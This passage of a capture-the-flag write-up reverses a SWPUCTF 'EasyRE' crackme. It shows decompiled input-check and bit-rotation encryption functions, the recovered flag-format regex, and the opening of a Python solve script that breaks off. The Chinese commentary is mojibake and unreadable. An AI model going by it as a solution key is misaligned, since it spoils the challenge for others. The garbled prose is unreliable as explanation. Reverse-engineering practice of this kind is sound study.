class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_DWORD *__thiscall <span class="title">sub_401FE0</span><span class="params">(_DWORD *<span class="keyword">this</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line"></span><br><span class="line">  *<span class="keyword">this</span> = &amp;EASYRE::`vftable<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">  this[1] = 0;</span></span><br><span class="line"><span class="string">  *((_BYTE *)this + 52) = 8;</span></span><br><span class="line"><span class="string">  *((_BYTE *)this + 53) = 0xEA;</span></span><br><span class="line"><span class="string">  *((_BYTE *)this + 54) = 0x58;</span></span><br><span class="line"><span class="string">  *((_BYTE *)this + 55) = 0xDE;</span></span><br><span class="line"><span class="string">  *((_BYTE *)this + 56) = 0x94;</span></span><br><span class="line"><span class="string">  *((_BYTE *)this + 57) = 0xD0;</span></span><br><span class="line"><span class="string">  *((_BYTE *)this + 58) = 0x3B;</span></span><br><span class="line"><span class="string">  *((_BYTE *)this + 59) = 0xBE;</span></span><br><span class="line"><span class="string">  *((_BYTE *)this + 60) = 0x88;</span></span><br><span class="line"><span class="string">  *((_BYTE *)this + 61) = 0xD4;</span></span><br><span class="line"><span class="string">  *((_BYTE *)this + 62) = 0x32;</span></span><br><span class="line"><span class="string">  *((_BYTE *)this + 63) = 0xB6;</span></span><br><span class="line"><span class="string">  *((_BYTE *)this + 64) = 0x14;</span></span><br><span class="line"><span class="string">  *((_BYTE *)this + 65) = 0x82;</span></span><br><span class="line"><span class="string">  *((_BYTE *)this + 66) = 0xB7;</span></span><br><span class="line"><span class="string">  *((_BYTE *)this + 67) = 0xAF;</span></span><br><span class="line"><span class="string">  *((_BYTE *)this + 68) = 0x14;</span></span><br><span class="line"><span class="string">  *((_BYTE *)this + 69) = 0x54;</span></span><br><span class="line"><span class="string">  *((_BYTE *)this + 70) = 0x7F;</span></span><br><span class="line"><span class="string">  *((_BYTE *)this + 71) = 0xCF;</span></span><br><span class="line"><span class="string">  qmemcpy(this + 0x12, &quot;  03\&quot;3   0 203\&quot;   $ &quot;, 20);</span></span><br><span class="line"><span class="string">  sub_4030A0(this + 0x17);</span></span><br><span class="line"><span class="string">  sub_402DE0(this + 0x1A);</span></span><br><span class="line"><span class="string">  for ( i = 0; i &lt; 40; ++i )</span></span><br><span class="line"><span class="string">    *((_BYTE *)this + i + 12) = 0;</span></span><br><span class="line"><span class="string">  return this;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.rdata:004124E4 90 21 40 00                   ??_7EASYRE@@6B@ dd offset sub_402190    ; DATA XREF: sub_401FE0+2Bâ†‘o</span><br><span class="line">.rdata:004124E4                                                                       ; sub_4021C0+Aâ†‘o</span><br><span class="line">.rdata:004124E4                                                                       ; sub_40F360+Câ†‘o</span><br><span class="line">.rdata:004124E8 F0 21 40 00                   dd offset sub_4021F0</span><br><span class="line">.rdata:004124EC B0 24 40 00                   dd offset sub_4024B0</span><br><span class="line">.rdata:004124F0 00 25 40 00                   dd offset sub_402500</span><br><span class="line">.rdata:004124F4 F0 22 40 00                   dd offset sub_4022F0</span><br><span class="line">.rdata:004124F8 A0 23 40 00                   dd offset sub_4023A0</span><br><span class="line">.rdata:004124FC E0 26 40 00                   dd offset sub_4026E0</span><br><span class="line">.rdata:00412500 30 27 40 00                   dd offset sub_402730</span><br><span class="line">.rdata:00412504 E0 23 40 00                   dd offset sub_4023E0</span><br><span class="line">.rdata:00412508 A0 28 40 00                   dd offset sub_4028A0</span><br><span class="line">.rdata:0041250C 00 2A 40 00                   dd offset sub_402A00</span><br><span class="line">.rdata:00412510 40 24 40 00                   dd offset sub_402440</span><br><span class="line">.rdata:00412514 00 00 00 00                   align 8</span><br></pre></td></tr></table></figure><p>â€‹    </p><h4 id="sub-40F150"><a href="#sub-40F150" class="headerlink" title="sub_40F150"></a>sub_40F150</h4><p>æ‰¾åˆ°å¯¹æ¯”å‡½æ•°</p><p> if ( sub_A124B0(va, input) )è¾“å‡ºcongratulationsè¯´æ˜sub_A124B0æ˜¯æˆ‘ä»¬ä¸»è¦å…³æ³¨çš„å‡½æ•°</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_40F150</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, ...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v6[<span class="number">10</span>]; <span class="comment">// [esp+Ch] [ebp-38h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+40h] [ebp-4h]</span></span><br><span class="line">  va_list va; <span class="comment">// [esp+54h] [ebp+10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">va_start</span>(va, a2);</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="built_in">sizeof</span>(v6));</span><br><span class="line">  v2 = <span class="built_in">printf</span>(std::cout, <span class="string">&quot;Please input your flag : &quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, sub_40F8F0);</span><br><span class="line">  <span class="built_in">sub_40F930</span>(std::cin, v6);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">sub_4024B0</span>(v6) )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="built_in">printf</span>(std::cout, &amp;unk_4122F0);        <span class="comment">// congratulations</span></span><br><span class="line">                                                <span class="comment">// </span></span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, sub_40F8F0);</span><br><span class="line">    v7 = <span class="number">-1</span>;</span><br><span class="line">    <span class="built_in">sub_4021C0</span>(va);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="built_in">printf</span>(std::cout, &amp;unk_41231C);        <span class="comment">// sorryï¼Œtry again</span></span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v5, sub_40F8F0);</span><br><span class="line">    v7 = <span class="number">-1</span>;</span><br><span class="line">    <span class="built_in">sub_4021C0</span>(va);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="sub-4024B0"><a href="#sub-4024B0" class="headerlink" title="sub_4024B0"></a>sub_4024B0</h4><p>å¯¹ç…§è™šå‡½æ•°è¡¨</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL __thiscall <span class="title">sub_D724B0</span><span class="params">(_DWORD *<span class="keyword">this</span>, <span class="type">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  BOOL result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">this</span>[<span class="number">2</span>] = a2;</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (*(<span class="built_in">int</span> (__thiscall **)(_DWORD *))(*<span class="keyword">this</span> + <span class="number">0xC</span>))(<span class="keyword">this</span>) )<span class="comment">// sub_402500 00D72500</span></span><br><span class="line">  &#123;</span><br><span class="line">    (*(<span class="built_in">void</span> (__thiscall **)(_DWORD *))(*<span class="keyword">this</span> + <span class="number">0x18</span>))(<span class="keyword">this</span>);<span class="comment">// sub_4026E0 00D824FC</span></span><br><span class="line">    <span class="keyword">if</span> ( (*(<span class="built_in">int</span> (__thiscall **)(_DWORD *))(*<span class="keyword">this</span> + <span class="number">0x28</span>))(<span class="keyword">this</span>) )<span class="comment">// sub_402A00 00D72A00</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç®€åŒ–ä¸€ä¸‹å°±æ˜¯</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> sub_402500ï¼ˆï¼‰</span><br><span class="line">    sub_<span class="number">4026E0</span>ï¼ˆï¼‰</span><br><span class="line">    <span class="function"><span class="keyword">if</span> <span class="title">sub_402A00</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="keyword">return</span> 1</span></span><br><span class="line"><span class="function"><span class="keyword">return</span> 0</span></span><br></pre></td></tr></table></figure><h4 id="sub-D72500"><a href="#sub-D72500" class="headerlink" title="sub_D72500"></a>sub_D72500</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __thiscall <span class="title">sub_D72500</span><span class="params">(<span class="type">const</span> <span class="type">char</span> **<span class="keyword">this</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+Ch] [ebp-B0h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v3; <span class="comment">// [esp+14h] [ebp-A8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+24h] [ebp-98h]</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">56</span>]; <span class="comment">// [esp+30h] [ebp-8Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">20</span>]; <span class="comment">// [esp+68h] [ebp-54h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">48</span>]; <span class="comment">// [esp+7Ch] [ebp-40h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+B8h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = &amp;<span class="keyword">this</span>[<span class="number">2</span>][<span class="built_in">strlen</span>(<span class="keyword">this</span>[<span class="number">2</span>])];</span><br><span class="line">  <span class="built_in">strcpy</span>(v8, <span class="string">&quot;Ncg`esdvLkLgk$mL=Lgk$mL=Lgk$mL=Lgk$mL=Lgk$mLm&quot;</span>);</span><br><span class="line">  <span class="built_in">sub_D726C0</span>(v6, <span class="number">0x38u</span>);                        <span class="comment">// åˆå§‹åŒ–v6</span></span><br><span class="line">  <span class="built_in">sub_D72B00</span>(v6);</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">45</span>; ++i )</span><br><span class="line">    v8[i] ^= <span class="number">0x10u</span>;                             <span class="comment">// ^swpuctf\&#123;\w&#123;4&#125;\-\w&#123;4&#125;\-\w&#123;4&#125;\-\w&#123;4&#125;\-\w&#123;4&#125;\&#125;</span></span><br><span class="line">  <span class="built_in">sub_D726C0</span>(v7, <span class="number">0x14u</span>);</span><br><span class="line">  <span class="built_in">sub_D72A70</span>(v8, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">LOBYTE</span>(v9) = <span class="number">1</span>;</span><br><span class="line">  v2 = (<span class="type">unsigned</span> __int8)<span class="built_in">sub_D74260</span>(<span class="keyword">this</span>[<span class="number">2</span>], v3, v6, v7, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">LOBYTE</span>(v9) = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">sub_D72A50</span>(v7);</span><br><span class="line">  v9 = <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">sub_D726A0</span>();</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202501031630537.png" alt="1735892999415.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^swpuctf\&#123;\w&#123;4&#125;\-\w&#123;4&#125;\-\w&#123;4&#125;\-\w&#123;4&#125;\-\w&#123;4&#125;\&#125;</span><br></pre></td></tr></table></figure><p>æœ‰ç‚¹åƒæ­£åˆ™è¡¨è¾¾å¼ï¼Œä¼°è®¡æ˜¯flagæ ¼å¼</p><h4 id="sub-A12730"><a href="#sub-A12730" class="headerlink" title="sub_A12730"></a>sub_A12730</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __thiscall <span class="title">sub_A12730</span><span class="params">(_DWORD *<span class="keyword">this</span>, <span class="type">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v4; <span class="comment">// al</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// cf</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// bl</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// t2</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+Ch] [ebp-30h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+14h] [ebp-28h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [esp+1Ch] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [esp+20h] [ebp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [esp+24h] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [esp+28h] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [esp+2Ch] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [esp+30h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// [esp+34h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  v15 = <span class="number">0</span>;</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  v18 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="keyword">this</span>[<span class="number">2</span>] + <span class="number">5</span> * a2 + <span class="number">8</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i )</span><br><span class="line">    *(&amp;v13 + i) = *(i + v10);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">4</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v4 = *(&amp;v13 + v2);                          <span class="comment">// å–å•ä¸ªå­—ç¬¦</span></span><br><span class="line">    _DL = v4;</span><br><span class="line">    __asm &#123; rcl     dl, <span class="number">1</span> &#125;                     <span class="comment">// å¾ªç¯å·¦ç§»ç›´åˆ°CFä¸º1</span></span><br><span class="line">    *(&amp;v15 + v2) = <span class="number">1</span>;                           <span class="comment">// å°†1å†™å…¥v15 v2ä¸ªå­—èŠ‚çš„ä½ç½®</span></span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span>                                          <span class="comment">// v8=v6å·¦ç§»7ä½</span></span><br><span class="line">                                                <span class="comment">// v6=v4æœ€ä½ä½</span></span><br><span class="line">                                                <span class="comment">// v4å»æ‰æœ€ä½æœ‰æ•ˆä½</span></span><br><span class="line">    &#123;</span><br><span class="line">      v8 = v6 &lt;&lt; <span class="number">7</span>;</span><br><span class="line">      v6 = v4 &amp; <span class="number">1</span>;</span><br><span class="line">      v4 = (v4 &gt;&gt; <span class="number">1</span>) | v8;</span><br><span class="line">      ++v7;                                     <span class="comment">// v7è®¡ç®—v4ä¸­1çš„ä¸ªæ•°</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v6 );                               <span class="comment">// å¦‚æœv6ä¸º1 å³v4çš„å½“å‰æœ€ä½æœ‰æ•ˆä½æ˜¯ 1ï¼Œç»§ç»­å¾ªç¯ï¼Œ</span></span><br><span class="line">                                                <span class="comment">// v6ä¸º0åˆ™ç»“æŸå¾ªç¯</span></span><br><span class="line">    *(&amp;v16 + v2++) = v7 - <span class="number">1</span>;                    <span class="comment">// ä½å®½åº¦v16=v7-1</span></span><br><span class="line">    --v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v3 );</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    *(&amp;v14 + j) = *(&amp;v16 + j) + *(&amp;v15 + j);    <span class="comment">// å³è¾¹0çš„ä¸ªæ•°+å·¦ç§»è‡³è¿›ä½ä¸ªæ•°</span></span><br><span class="line">    *(&amp;v17 + j) = *(&amp;v13 + j) &lt;&lt; *(&amp;v15 + j);   <span class="comment">// flag&lt;&lt;å·¦ç§»è‡³è¿›ä½ä¸ªæ•°</span></span><br><span class="line">    *(&amp;v18 + j) = (*(&amp;v13 + j) &lt;&lt; (<span class="number">8</span> - *(&amp;v16 + j))) | ((*(&amp;v13 + j) &gt;&gt; (<span class="number">8</span> - *(&amp;v15 + j))) &lt;&lt; *(&amp;v15 + j));</span><br><span class="line">  &#125;                                             <span class="comment">// [flag&lt;&lt;ï¼ˆ8-å³è¾¹0çš„ä¸ªæ•°ï¼‰]|&#123;[flag&gt;&gt;(8-å·¦ç§»è‡³è¿›ä½ä¸ªæ•°ï¼‰]&lt;&lt;å·¦ç§»è‡³è¿›ä½ä¸ªæ•°&#125;</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_A12F80</span>(&amp;v13);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¤–é¢çš„dowhileå…¶å®æ˜¯åœ¨è®¡ç®—å·¦ç§»å‡ ä½CFä¸º1ï¼Œé‡Œé¢çš„dowhileæ˜¯åœ¨è®¡ç®—å³è¾¹0çš„ä¸ªæ•°</p><h4 id="sub-A128A0"><a href="#sub-A128A0" class="headerlink" title="sub_A128A0"></a>sub_A128A0</h4><p>ä¸æƒ³çœ‹äº†ï¼Œå¤§æ¦‚çœ‹çœ‹æ„Ÿè§‰èƒ½çˆ†ç ´ï¼Œä¸è¡Œå†å›æ¥çœ‹</p><p>å¥½å§è¿˜æ˜¯å¾—çœ‹</p><p>forå¾ªç¯åµŒå¥—if elseï¼Œå¤§æ¦‚æŠŠä¸Šé¢åŠ å¯†å®Œçš„flagåˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†å¤„ç†ã€‚</p><p>å‰å››æ¬¡å¾ªç¯èµ°elseï¼Œå¯¹ <code>v15 + i + 20</code> èµ‹å€¼</p><p>åå››æ¬¡èµ°ifï¼Œå¯¹ <code>v17 + 0x1A</code> è¿›è¡Œæ“ä½œï¼Œæ›´æ–° <code>v14</code> å¹¶å¯¹ <code>v15</code> æ‰§è¡Œä½æ“ä½œã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v17 = this;</span><br><span class="line">v15 = this + 3;</span><br><span class="line">*v15 |= *(v10 + i + 0x10) &lt;&lt; v14;</span><br><span class="line">*v15 |= *(v5 + i + 0x10) &lt;&lt; v14;</span><br><span class="line">*(v15 + i + 20) = *(v8 + i + 0xC) | v7;</span><br></pre></td></tr></table></figure><p>å› ä¸ºæˆ‘ä»¬å‰é¢å¾—åˆ°äº†flagæ ¼å¼ï¼Œå¯ä»¥åˆ¤æ–­å‡ºæ¥whileèµ°5æ¬¡ã€‚</p><p>ä¸€ä¸ªå‚ä¸äº†åŠ å¯†ä¸€ä¸ªæ²¡å‚ä¸</p><p>è¿™é‡Œç”¨äº†ä½¬ç®€åŒ–å®Œçš„åŠ å¯†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> &#123;</span><br><span class="line">    v9 = sub_402DC0(v17 + <span class="number">26</span>);</span><br><span class="line">    v14 -= *(<span class="type">unsigned</span> __int8 *)(v9 + i); <span class="comment">// v14çš„åˆå§‹å€¼ä¸º0x20</span></span><br><span class="line">    *v15 |= res3 &lt;&lt; v14;</span><br><span class="line">&#125;   </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    v14 -= <span class="number">8</span> - res1;</span><br><span class="line">    *v15 |= res2 &lt;&lt; v14;</span><br><span class="line">    *((_BYTE *)v15 + i + <span class="number">20</span>) = <span class="number">0</span>çš„ä¸ªæ•° | (<span class="number">16</span> * å·¦ç§»è¿›ä½ä½æ•°);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç†ä¸€ä¸‹é€»è¾‘</p><ul><li>æ ¡éªŒflagæ ¼å¼</li><li>åŠ å¯†</li><li>5æ¬¡å¾ªç¯å¤„ç†åŠ å¯†ï¼Œä¸¤ç§ç»“æœï¼Œä¸€ä¸ªå—å­—ç¬¦å½±å“ä¸€ä¸ªç‹¬ç«‹å­˜åœ¨ã€‚</li><li>å¯¹æ¯”</li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#exp</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ£€æŸ¥å·¦ç§»è¿›ä½ä½æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_1</span>(<span class="params">c</span>): 